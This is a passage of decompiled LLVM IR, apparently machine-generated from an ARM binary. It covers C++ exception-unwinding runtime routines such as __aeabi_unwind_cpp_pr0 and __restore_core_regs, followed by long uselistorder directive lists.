bb163:                                            ; preds = %dec_label_pc_1a85c, %bb162
  store i32 %v0_1a84c, i32* %r0.global-to-local, align 4
  store i32 %v2_1a870, i32* %r2.global-to-local, align 4
  %v4_1a87c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 100) to i32*), align 4
  store i32 108680, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a87c)
  %v0_1a888 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a888 = icmp eq i32 %v0_1a888, 0
  br i1 %v2_1a888, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_1a894.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_1a894

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_1a8a0

dec_label_pc_1a894:                               ; preds = %.thread25, %dec_label_pc_1a84c
  %v3_1a894 = phi i32 [ %v3_1a894.pr, %.thread25 ], [ %v1_1a84c, %dec_label_pc_1a84c ]
  %v2_1a898 = icmp eq i32 %v3_1a894, 0
  br i1 %v2_1a898, label %dec_label_pc_1a8a0, label %dec_label_pc_1a9f8

dec_label_pc_1a8a0:                               ; preds = %bb164, %dec_label_pc_1a94c, %dec_label_pc_1a920, %dec_label_pc_1a894, %dec_label_pc_1a834
  %v0_1a8a0 = load i32, i32* @r7, align 4
  %v1_1a8a0 = add i32 %v0_1a8a0, 8
  %v1_1a608 = inttoptr i32 %v1_1a8a0 to i32*
  %v2_1a608 = load i32, i32* %v1_1a608, align 4
  %v2_1a60c = icmp eq i32 %v2_1a608, 0
  br i1 %v2_1a60c, label %dec_label_pc_1a6c8, label %dec_label_pc_1a614.preheader

dec_label_pc_1a8a8:                               ; preds = %entry
  %v3_1a8a8 = udiv i32 %v2_1a59c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_1a8b8 = mul nuw nsw i32 %v3_1a8a8, 4
  %v3_1a8bc = mul i32 %v2_1a59c, 65536
  %v2_1a8c0 = add i32 %v6_1a8b8, %v4_1a59c
  store i32 %v3_1a8bc, i32* %v4_1a5bc, align 8
  br label %dec_label_pc_1a5e4

dec_label_pc_1a8d0:                               ; preds = %bb159, %dec_label_pc_1a77c
  %v1_1a8d0 = add i32 %v0_1a76c, 4
  br label %dec_label_pc_1a8d4

dec_label_pc_1a8d4:                               ; preds = %dec_label_pc_1a914, %dec_label_pc_1a8d0
  %v0_1a8d4 = phi i32 [ %v2_1a914, %dec_label_pc_1a914 ], [ %v2_1a76c, %dec_label_pc_1a8d0 ]
  %storemerge = phi i32 [ %v4_1a914, %dec_label_pc_1a914 ], [ %v1_1a8d0, %dec_label_pc_1a8d0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_1a8d4 = icmp slt i32 %v0_1a8d4, 0
  br i1 %v1_1a8d4, label %dec_label_pc_1a81c, label %dec_label_pc_1a8dc

dec_label_pc_1a8dc:                               ; preds = %dec_label_pc_1a810, %dec_label_pc_1a8d4, %dec_label_pc_1a9e8, %dec_label_pc_1a81c
  %v0_1a8e0 = phi i32 [ %v1_1a820, %dec_label_pc_1a81c ], [ %storemerge, %dec_label_pc_1a8d4 ], [ %v1_1a9ec, %dec_label_pc_1a9e8 ], [ %v0_1a81c.pre, %dec_label_pc_1a810 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_1a81c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a8d4 ], [ %v1_1a9e8, %dec_label_pc_1a9e8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a810 ]
  %v0_1a8dc = load i32, i32* @sl, align 4
  %v3_1a8dc = mul i32 %v0_1a8dc, 4
  %v2_1a8e0 = add i32 %v3_1a8dc, %v0_1a8e0
  %v1_1a60865 = inttoptr i32 %v2_1a8e0 to i32*
  %v2_1a60866 = load i32, i32* %v1_1a60865, align 4
  %v2_1a60c68 = icmp eq i32 %v2_1a60866, 0
  br i1 %v2_1a60c68, label %dec_label_pc_1a6c8, label %dec_label_pc_1a614.preheader.lr.ph

dec_label_pc_1a8e8:                               ; preds = %dec_label_pc_1a768
  %v0_1a8f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a8f8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1a900 = load i32, i32* @r8, align 4
  %v1_1a900 = add i32 %v0_1a900, 32
  %v2_1a900 = inttoptr i32 %v1_1a900 to i32*
  %v3_1a900 = load i32, i32* %v2_1a900, align 4
  store i32 %v3_1a900, i32* @r4, align 4
  %v5_1a904 = call i32 @_Unwind_VRS_Get(i32 %v0_1a8f8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a904, i32* %r0.global-to-local, align 4
  %v3_1a908 = load i32, i32* %stack_var_-48, align 4
  %v0_1a90c = load i32, i32* @r4, align 4
  %v9_1a90c = icmp eq i32 %v0_1a90c, %v3_1a908
  br i1 %v9_1a90c, label %dec_label_pc_1a9b4, label %dec_label_pc_1a8e8.dec_label_pc_1a914_crit_edge

dec_label_pc_1a8e8.dec_label_pc_1a914_crit_edge:  ; preds = %dec_label_pc_1a8e8
  %v0_1a914.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a914

dec_label_pc_1a914:                               ; preds = %dec_label_pc_1a8e8.dec_label_pc_1a914_crit_edge, %dec_label_pc_1a9b4
  %v0_1a914 = phi i32 [ %v0_1a914.pre, %dec_label_pc_1a8e8.dec_label_pc_1a914_crit_edge ], [ %v1_1a9b8, %dec_label_pc_1a9b4 ]
  %v1_1a914 = inttoptr i32 %v0_1a914 to i32*
  %v2_1a914 = load i32, i32* %v1_1a914, align 4
  %v4_1a914 = add i32 %v0_1a914, 4
  store i32 %v4_1a914, i32* @r7, align 4
  br label %dec_label_pc_1a8d4

dec_label_pc_1a920:                               ; preds = %dec_label_pc_1a828
  %v0_1a930 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a930, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1a938 = load i32, i32* @r8, align 4
  %v1_1a938 = add i32 %v0_1a938, 32
  %v2_1a938 = inttoptr i32 %v1_1a938 to i32*
  %v3_1a938 = load i32, i32* %v2_1a938, align 4
  store i32 %v3_1a938, i32* @r4, align 4
  %v5_1a93c = call i32 @_Unwind_VRS_Get(i32 %v0_1a930, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a93c, i32* %r0.global-to-local, align 4
  %v3_1a940 = load i32, i32* %stack_var_-48, align 4
  %v0_1a944 = load i32, i32* @r4, align 4
  %v9_1a944 = icmp eq i32 %v0_1a944, %v3_1a940
  br i1 %v9_1a944, label %dec_label_pc_1a94c, label %dec_label_pc_1a8a0

dec_label_pc_1a94c:                               ; preds = %dec_label_pc_1a920
  %v0_1a94c = load i32, i32* @r8, align 4
  %v1_1a94c = add i32 %v0_1a94c, 40
  %v2_1a94c = inttoptr i32 %v1_1a94c to i32*
  %v3_1a94c = load i32, i32* %v2_1a94c, align 4
  %v1_1a950 = load i32, i32* @r7, align 4
  %v9_1a950 = icmp eq i32 %v3_1a94c, %v1_1a950
  br i1 %v9_1a950, label %dec_label_pc_1a958, label %dec_label_pc_1a8a0

dec_label_pc_1a958:                               ; preds = %dec_label_pc_1a94c
  %v1_1a958 = inttoptr i32 %v3_1a94c to i32*
  %v2_1a958 = load i32, i32* %v1_1a958, align 4
  %v1_1a95c = and i32 %v2_1a958, 1073741824
  %v2_1a95c = icmp eq i32 %v1_1a95c, 0
  br i1 %v2_1a95c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_1a958
  %v2_1a960 = or i32 %v2_1a958, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_1a958
  %tmp208 = bitcast i32 %v2_1a958 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_1a964 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_1a968 = phi i32 [ %v2_1aa98, %.thread28 ], [ %v2_1aa98, %bb169 ], [ %v3_1a94c, %bb165 ], [ %v3_1a94c, %.thread26 ]
  %v0_1a968 = phi i32 [ %v2_1aaa8, %.thread28 ], [ %v2_1aaa4, %bb169 ], [ %v2_1a960, %bb165 ], [ %v2_1a964, %.thread26 ]
  %v2_1a968 = add i32 %v0_1a968, %v1_1a968
  store i32 %v2_1a968, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1a980 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a980, i32* %r0.global-to-local, align 4
  %v5_1a988 = call i32 @_Unwind_VRS_Set(i32 %v0_1a980, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_1a980, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a9a0 = load i32, i32* @r8, align 4
  store i32 %v0_1a9a0, i32* %stack_var_-48, align 4
  %v5_1a9a8 = call i32 @_Unwind_VRS_Set(i32 %v0_1a980, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a75c

dec_label_pc_1a9b4:                               ; preds = %dec_label_pc_1a8e8
  %v0_1a9b4 = load i32, i32* @r8, align 4
  %v1_1a9b4 = add i32 %v0_1a9b4, 40
  %v2_1a9b4 = inttoptr i32 %v1_1a9b4 to i32*
  %v3_1a9b4 = load i32, i32* %v2_1a9b4, align 4
  %v1_1a9b8 = load i32, i32* @r7, align 4
  %v9_1a9b8 = icmp eq i32 %v3_1a9b4, %v1_1a9b8
  br i1 %v9_1a9b8, label %dec_label_pc_1a9c0, label %dec_label_pc_1a914

dec_label_pc_1a9c0:                               ; preds = %dec_label_pc_1a9b4
  %v1_1a9c4 = add i32 %v3_1a9b4, 4
  store i32 %v1_1a9c4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_1a9cc = add i32 %v0_1a9b4, 44
  %v3_1a9cc = inttoptr i32 %v2_1a9cc to i32*
  store i32 0, i32* %v3_1a9cc, align 4
  %v0_1a9d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a9d0 = load i32, i32* @r8, align 4
  %v2_1a9d0 = add i32 %v1_1a9d0, 48
  %v3_1a9d0 = inttoptr i32 %v2_1a9d0 to i32*
  store i32 %v0_1a9d0, i32* %v3_1a9d0, align 4
  %v0_1a9d4 = load i32, i32* @sl, align 4
  %v1_1a9d4 = load i32, i32* @r8, align 4
  %v2_1a9d4 = add i32 %v1_1a9d4, 40
  %v3_1a9d4 = inttoptr i32 %v2_1a9d4 to i32*
  store i32 %v0_1a9d4, i32* %v3_1a9d4, align 4
  %v0_1a9d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a9d8 = load i32, i32* @r8, align 4
  %v2_1a9d8 = add i32 %v1_1a9d8, 52
  %v3_1a9d8 = inttoptr i32 %v2_1a9d8 to i32*
  store i32 %v0_1a9d8, i32* %v3_1a9d8, align 4
  %v0_1a9dc = load i32, i32* @r7, align 4
  %v1_1a9dc = inttoptr i32 %v0_1a9dc to i32*
  %v2_1a9dc = load i32, i32* %v1_1a9dc, align 4
  %v1_1a9e0 = icmp slt i32 %v2_1a9dc, 0
  br i1 %v1_1a9e0, label %dec_label_pc_1a9e8, label %dec_label_pc_1aa94

dec_label_pc_1a9e8:                               ; preds = %dec_label_pc_1a9c0
  %v0_1a9e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a9e8 = add i32 %v0_1a9e8, -3
  store i32 %v1_1a9e8, i32* %r2.global-to-local, align 4
  %v0_1a9ec = load i32, i32* %r0.global-to-local, align 4
  %v1_1a9ec = add i32 %v0_1a9ec, 4
  store i32 %v1_1a9ec, i32* @r6, align 4
  br label %dec_label_pc_1a8dc

dec_label_pc_1a9f8:                               ; preds = %dec_label_pc_1a808, %dec_label_pc_1a894, %dec_label_pc_1a7c0, %dec_label_pc_1a794.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1aa08 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1aa08, i32* %r0.global-to-local, align 4
  %v5_1aa10 = call i32 @_Unwind_VRS_Get(i32 %v0_1aa08, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1aa14 = load i32, i32* @r7, align 4
  %v1_1aa14 = load i32, i32* @r8, align 4
  %v2_1aa14 = add i32 %v1_1aa14, 40
  %v3_1aa14 = inttoptr i32 %v2_1aa14 to i32*
  store i32 %v0_1aa14, i32* %v3_1aa14, align 4
  %v3_1aa18 = load i32, i32* %stack_var_-48, align 4
  %v3_1aa1c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1aa1c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_1aa24 = load i32, i32* @r8, align 4
  %v2_1aa24 = add i32 %v1_1aa24, 32
  %v3_1aa24 = inttoptr i32 %v2_1aa24 to i32*
  store i32 %v3_1aa18, i32* %v3_1aa24, align 4
  %v0_1aa28 = load i32, i32* %r2.global-to-local, align 4
  %v1_1aa28 = load i32, i32* @r8, align 4
  %v2_1aa28 = add i32 %v1_1aa28, 36
  %v3_1aa28 = inttoptr i32 %v2_1aa28 to i32*
  store i32 %v0_1aa28, i32* %v3_1aa28, align 4
  %v1_1a764.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a75c

dec_label_pc_1aa30:                               ; preds = %bb155
  %v1_1aa30 = inttoptr i32 %v0_1a6b8 to i32*
  %v2_1aa30 = load i32, i32* %v1_1aa30, align 4
  %v1_1aa34 = add i32 %v0_1a6b8, 4
  %v1_1aa38 = and i32 %v2_1aa30, 1073741824
  %v2_1aa38 = icmp eq i32 %v1_1aa38, 0
  %v2_1aa3c = or i32 %v2_1aa30, -2147483648
  %tmp210 = bitcast i32 %v2_1aa30 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_1aa40 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_1aa38, i32 %v2_1aa40, i32 %v2_1aa3c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_1aa44 = load i32, i32* @r8, align 4
  %v2_1aa44 = add i32 %v1_1aa44, 56
  %v3_1aa44 = inttoptr i32 %v2_1aa44 to i32*
  store i32 %v1_1aa34, i32* %v3_1aa44, align 4
  %v0_1aa48 = load i32, i32* @r8, align 4
  store i32 %v0_1aa48, i32* %r0.global-to-local, align 4
  %v4_1aa54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 28) to i32*), align 4
  store i32 109152, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1aa54)
  %v0_1aa60 = load i32, i32* %r0.global-to-local, align 4
  %v2_1aa60 = icmp eq i32 %v0_1aa60, 0
  br i1 %v2_1aa60, label %dec_label_pc_1a758, label %dec_label_pc_1aa68

dec_label_pc_1aa68:                               ; preds = %dec_label_pc_1aa30
  %v0_1aa68 = load i32, i32* %r4.global-to-local, align 4
  %v1_1aa68 = load i32, i32* @r7, align 4
  %v2_1aa68 = add i32 %v1_1aa68, %v0_1aa68
  store i32 %v2_1aa68, i32* %stack_var_-48, align 4
  %v0_1aa78 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1aa78, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_1aa88 = call i32 @_Unwind_VRS_Set(i32 %v0_1aa78, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a75c

dec_label_pc_1aa94:                               ; preds = %dec_label_pc_1a9c0
  %v0_1aa94 = load i32, i32* @sl, align 4
  %v3_1aa94 = mul i32 %v0_1aa94, 4
  %v0_1aa98 = load i32, i32* %r0.global-to-local, align 4
  %v2_1aa98 = add i32 %v0_1aa98, %v3_1aa94
  %v3_1aa98 = inttoptr i32 %v2_1aa98 to i32*
  %v4_1aa98 = load i32, i32* %v3_1aa98, align 4
  %v1_1aa9c = and i32 %v4_1aa98, 1073741824
  %v2_1aa9c = icmp eq i32 %v1_1aa9c, 0
  br i1 %v2_1aa9c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_1aa94
  %v2_1aaa4 = or i32 %v4_1aa98, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_1aa94
  %tmp212 = bitcast i32 %v4_1aa98 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_1aaa8 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_1aa98, { 2, 1, 0 }
  uselistorder i32 %v1_1a9ec, { 1, 0 }
  uselistorder i32 %v1_1a9e8, { 1, 0 }
  uselistorder i32 %v1_1a9b8, { 1, 0 }
  uselistorder i32 %v0_1a980, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1a94c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a914, { 1, 0 }
  uselistorder i32 %v0_1a914, { 1, 0 }
  uselistorder i32 %v2_1a60866, { 1, 0 }
  uselistorder i32 %v2_1a8e0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_1a608, { 1, 0 }
  uselistorder i32 %v1_1a8a0, { 1, 0 }
  uselistorder i32 %v3_1a83c, { 2, 0, 1 }
  uselistorder i32 %v0_1a81c, { 1, 0 }
  uselistorder i32 %v0_1a81c.pre, { 1, 0 }
  uselistorder i32 %v1_1a774, { 1, 0 }
  uselistorder i32 %v2_1a76c, { 1, 0 }
  uselistorder i32 %v0_1a6fc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_1a6bc, { 1, 0 }
  uselistorder i32 %v1_1a6b8, { 1, 0 }
  uselistorder i32 %v0_1a6b8, { 1, 0, 2 }
  uselistorder i32 %v4_1a690, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1a834, { 1, 2, 0 }
  uselistorder i32 %v0_1a668, { 1, 0 }
  uselistorder i32 %v3_1a664, { 1, 0, 2 }
  uselistorder i32 %v1_1a638, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_1a870, { 1, 0 }
  uselistorder i1 %v2_1a6a4, { 1, 0, 2 }
  uselistorder i32 %v1_1a5a8, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 78, 0, 15, 16, 76, 17, 37, 38, 18, 36, 4, 39, 19, 40, 1, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 29, 6, 30, 41, 42, 43, 7, 44, 45, 46, 47, 8, 48, 49, 50, 51, 9, 52, 10, 53, 54, 31, 55, 11, 56, 57, 58, 32, 59, 12, 60, 61, 33, 62, 63, 64, 65, 66, 34, 67, 13, 68, 69, 70, 71, 72, 73, 35, 74, 14, 75, 3, 5, 77 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 27, 1, 2, 4, 13, 14, 10, 11, 12, 15, 17, 16, 5, 22, 23, 3, 24, 0, 25, 26, 6, 7, 18, 19, 8, 20, 9, 21 }
  uselistorder i32 48, { 24, 2, 0, 9, 7, 8, 13, 14, 10, 11, 21, 22, 23, 15, 17, 4, 12, 16, 1, 5, 18, 3, 19, 6, 20 }
  uselistorder i32 44, { 46, 2, 47, 48, 0, 16, 3, 17, 4, 5, 6, 28, 29, 30, 31, 32, 33, 25, 26, 27, 7, 34, 35, 8, 1, 9, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 10, 11, 12, 18, 19, 20, 21, 13, 22, 14, 23, 15, 24 }
  uselistorder i32 -2147483648, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i32 1073741824, { 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 144, 147, 143, 148, 28, 29, 30, 31, 32, 33, 34, 35, 36, 142, 37, 38, 39, 2, 40, 0, 3, 41, 42, 44, 43, 1, 47, 45, 46, 48, 54, 49, 55, 50, 56, 51, 52, 53, 58, 59, 60, 61, 57, 141, 63, 62, 65, 64, 67, 68, 69, 66, 70, 72, 73, 74, 71, 75, 76, 78, 79, 77, 80, 145, 81, 84, 82, 85, 83, 87, 88, 89, 86, 90, 95, 91, 96, 92, 97, 93, 94, 99, 100, 101, 98, 102, 146, 103, 104, 105, 107, 106, 108, 116, 109, 117, 110, 118, 111, 119, 112, 120, 113, 114, 115, 122, 123, 124, 125, 121, 126, 131, 127, 132, 128, 129, 130, 134, 136, 137, 138, 133, 135, 140, 139 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_24478.766 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 15, 27, 68, 86, 69, 87, 16, 17, 70, 71, 72, 88, 18, 89, 90, 91, 19, 92, 20, 73, 93, 94, 21, 22, 23, 95, 74, 96, 24, 97, 25, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 104, 105, 34, 33, 35, 106, 107, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 108, 5, 109, 110, 111, 112, 113, 32, 76, 114, 81 }
  uselistorder i32 -2, { 0, 33, 34, 6, 3, 4, 2, 7, 8, 9, 1, 5, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 27, 10, 11, 12, 13, 14, 20, 19, 18, 17, 16, 15 }
  uselistorder i32 80, { 15, 16, 17, 1, 3, 2, 4, 5, 6, 12, 7, 8, 11, 9, 10, 13, 0, 14 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a9f8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1a914, { 1, 0 }
  uselistorder label %dec_label_pc_1a8dc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1a8a0, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_1a81c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_1a75c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_1a758, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1a6b8, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_1a614, { 1, 0 }
  uselistorder label %dec_label_pc_1a614.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1a614.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_1aab4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1aab4:
  %v0_1aab4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1aab4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1aab4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1aab4, %bb
  %v10_1aabc = phi i32 [ %arg1, %dec_label_pc_1aab4 ], [ 0, %bb ]
  ret i32 %v10_1aabc

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 27, 28, 29, 49, 19, 26, 50, 51, 52, 53, 54, 5, 4, 55, 42, 43, 30, 31, 20, 34, 33, 32, 35, 6, 8, 44, 21, 22, 7, 16, 9, 38, 17, 15, 18, 10, 11, 12, 36, 13, 45, 46, 47, 24, 48, 23, 25, 14, 39, 41, 37, 40, 56, 57 }
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 41, 15, 1, 16, 17, 37, 38, 39, 40, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1aac4 = load i32, i32* @r1, align 4
  %v2_1aac4 = load i32, i32* @r2, align 4
  %v4_1aac4 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_1aac4, i32 %v2_1aac4, i32 2)
  ret i32 %v4_1aac4
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1aacc = load i32, i32* @r1, align 4
  %v2_1aacc = load i32, i32* @r2, align 4
  %v4_1aacc = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_1aacc, i32 %v2_1aacc, i32 1)
  ret i32 %v4_1aacc
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1aad4 = load i32, i32* @r1, align 4
  %v2_1aad4 = load i32, i32* @r2, align 4
  %v4_1aad4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_1aad4, i32 %v2_1aad4, i32 0)
  ret i32 %v4_1aad4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 8, 9, 10, 56, 11, 0, 21, 12, 22, 57, 58, 59, 17, 18, 19, 20, 35, 36, 37, 38, 60, 61, 62, 73, 74, 75, 76, 65, 1, 66, 13, 63, 64, 2, 3, 4, 54, 55, 5, 6, 67, 68, 69, 70, 71, 72, 39, 43, 44, 45, 23, 14, 15, 16, 26, 27, 24, 25, 28, 29, 30, 31, 32, 33, 34, 7, 40, 41, 42, 46, 47, 48, 49, 50, 51, 52, 53 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1aadc = add i32 %tmp, 56
  %v4_1aadc = inttoptr i32 %v3_1aadc to i32*
  %v5_1aadc = load i32, i32* %v4_1aadc, align 4
  %v6_1aadc = add i32 %tmp, 60
  %v7_1aadc = inttoptr i32 %v6_1aadc to i32*
  %v8_1aadc = load i32, i32* %v7_1aadc, align 4
  %v2_1aae8 = load i32, i32* %arg1, align 4
  %v3_1aae8 = add i32 %tmp, 4
  %v4_1aae8 = inttoptr i32 %v3_1aae8 to i32*
  %v5_1aae8 = load i32, i32* %v4_1aae8, align 4
  store i32 %v5_1aae8, i32* @r1, align 4
  %v12_1aae8 = add i32 %tmp, 16
  %v13_1aae8 = inttoptr i32 %v12_1aae8 to i32*
  %v14_1aae8 = load i32, i32* %v13_1aae8, align 4
  store i32 %v14_1aae8, i32* @r4, align 4
  %v15_1aae8 = add i32 %tmp, 20
  %v16_1aae8 = inttoptr i32 %v15_1aae8 to i32*
  %v17_1aae8 = load i32, i32* %v16_1aae8, align 4
  store i32 %v17_1aae8, i32* @r5, align 4
  %v18_1aae8 = add i32 %tmp, 24
  %v19_1aae8 = inttoptr i32 %v18_1aae8 to i32*
  %v20_1aae8 = load i32, i32* %v19_1aae8, align 4
  store i32 %v20_1aae8, i32* @r6, align 4
  %v21_1aae8 = add i32 %tmp, 28
  %v22_1aae8 = inttoptr i32 %v21_1aae8 to i32*
  %v23_1aae8 = load i32, i32* %v22_1aae8, align 4
  store i32 %v23_1aae8, i32* @r7, align 4
  %v24_1aae8 = add i32 %tmp, 32
  %v25_1aae8 = inttoptr i32 %v24_1aae8 to i32*
  %v26_1aae8 = load i32, i32* %v25_1aae8, align 4
  store i32 %v26_1aae8, i32* @r8, align 4
  %v27_1aae8 = add i32 %tmp, 36
  %v28_1aae8 = inttoptr i32 %v27_1aae8 to i32*
  %v29_1aae8 = load i32, i32* %v28_1aae8, align 4
  store i32 %v29_1aae8, i32* @sb, align 4
  %v30_1aae8 = add i32 %tmp, 40
  %v31_1aae8 = inttoptr i32 %v30_1aae8 to i32*
  %v32_1aae8 = load i32, i32* %v31_1aae8, align 4
  store i32 %v32_1aae8, i32* @sl, align 4
